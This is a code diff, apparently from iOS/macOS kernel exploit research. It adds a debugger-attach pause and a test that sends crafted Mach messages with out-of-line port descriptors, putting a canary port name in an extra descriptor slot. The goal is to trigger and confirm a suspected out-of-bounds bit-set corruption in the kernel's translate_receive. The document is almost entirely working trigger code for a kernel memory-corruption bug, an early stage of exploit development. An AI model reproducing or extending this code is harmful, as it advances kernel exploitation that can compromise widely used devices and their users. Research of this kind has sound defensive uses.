@@ -377,6 +377,10 @@
     // Allocate 128 canary ports. Snapshot their urefs. Trigger translate_receive
     // with various w2 values (OOL counts). Snapshot again. Any delta = bit-set hit.
     [report appendString:@"\n--- translate_receive bit-set canary (128 ports) ---\n"];
+    [report appendFormat:@"DEBUG: pid=%d — attach debugserver now, 15s window\n", getpid()];
+    [self journal:[NSString stringWithFormat:@"DEBUG pid=%d — attach debugserver", getpid()]];
+    fflush(stdout);
+    sleep(15);  // give us time to attach lldb/debugserver
     #define CANARY_N 128
     mach_port_t canary[CANARY_N];
     uint32_t canaryAlive[CANARY_N];
@@ -459,6 +463,80 @@
     } else {
         [report appendString:@"No targeted hits — w2 is NOT the OOL count.\n"];
         [report appendString:@"Next: debugserver watchpoints to identify the real w2 source.\n"];
+    }
+
+    // --- OOB-value test: canary port names as OOB descriptor entries ---
+    // Fill the 65th OOL descriptor slot with a canary port name P (instead of NULL).
+    // count=65 is known to succeed. translate_receive processes all 65 descriptors.
+    // If w2 = port_name of the descriptor being translated, table[P] is accessed
+    // and the bit-set hits P's ipc_entry. We then check if P is alive.
+    [report appendString:@"\n--- OOB-value test: canary names in OOB descriptor slot ---\n"];
+    int oobValTested = 0, oobValDead = 0;
+    for (int i = 0; i < CANARY_N; i += 8) {
+        if (canaryAlive[i] != 1) continue;
+        uint32_t targetName = (uint32_t)canary[i];
+
+        // Build custom OOL message: 64 send rights + 1 canary name in slot 64
+        // Use the larger buffer (96 entries) but only fill up to slot 64.
+        mach_port_t oobValPorts[96] = {0};
+        for (int j = 0; j < 64; j++) oobValPorts[j] = port; // send rights
+        oobValPorts[64] = canary[i];  // THE canary name as OOB descriptor value
+
+        size_t oolSz = sizeof(mach_msg_ool_ports_descriptor_t);
+        size_t totalSz = sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + oolSz;
+        uint8_t sbuf[256] = {0};
+        mach_msg_header_t *sh = (mach_msg_header_t *)sbuf;
+        sh->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
+        sh->msgh_size = (mach_msg_size_t)totalSz;
+        sh->msgh_remote_port = port;
+        sh->msgh_local_port = MACH_PORT_NULL;
+        sh->msgh_id = 3;
+        mach_msg_body_t *sb = (mach_msg_body_t *)(sbuf + sizeof(mach_msg_header_t));
+        sb->msgh_descriptor_count = 1;
+        mach_msg_ool_ports_descriptor_t *od =
+            (mach_msg_ool_ports_descriptor_t *)(sbuf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t));
+        od->address = oobValPorts;
+        od->count = 65;   // 64 real + 1 canary name
+        od->disposition = MACH_MSG_TYPE_COPY_SEND;
+        od->deallocate = 0;
+        od->type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
+
+        kern_return_t okr = mach_msg(sh, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+                                      sh->msgh_size, 0, MACH_PORT_NULL, 250, MACH_PORT_NULL);
+        oobValTested++;
+        if (okr == KERN_SUCCESS) {
+            // drain
+            uint8_t rbuf[512] = {0};
+            mach_msg_header_t *rh = (mach_msg_header_t *)rbuf;
+            rh->msgh_size = sizeof(rbuf);
+            rh->msgh_local_port = port;
+            mach_msg(rh, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(rbuf), port, 250, MACH_PORT_NULL);
+        }
+        [self journal:[NSString stringWithFormat:@"oob_val_test name=%u send_kr=%d", targetName, okr]];
+
+        // Check THIS canary
+        memset(pingBuf, 0, sizeof(pingBuf));
+        mach_msg_header_t *ph = (mach_msg_header_t *)pingBuf;
+        ph->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+        ph->msgh_size = sizeof(mach_msg_header_t);
+        ph->msgh_remote_port = canary[i];
+        ph->msgh_local_port = MACH_PORT_NULL;
+        ph->msgh_id = 0;
+        kern_return_t skr = mach_msg(ph, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+                                     ph->msgh_size, 0, MACH_PORT_NULL, 50, MACH_PORT_NULL);
+        if (skr != KERN_SUCCESS) {
+            oobValDead++;
+            [report appendFormat:@"OOB-VAL HIT: port=%u name=%u DEAD after OOB descriptor insert (send_kr=%d)\n",
+             canary[i], targetName, skr];
+        } else {
+            mach_msg(ph, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(pingBuf), canary[i], 50, MACH_PORT_NULL);
+        }
+    }
+    [report appendFormat:@"oob-value result: %d tested, %d killed\n", oobValTested, oobValDead];
+    if (oobValDead > 0) {
+        [report appendString:@"OOB DESCRIPTOR BIT-SET CONFIRMED — w2 = port name in descriptor.\n"];
+    } else {
+        [report appendString:@"No OOB-value hits. Debugserver needed to trace w2.\n"];
     }
 
     // Snapshot again
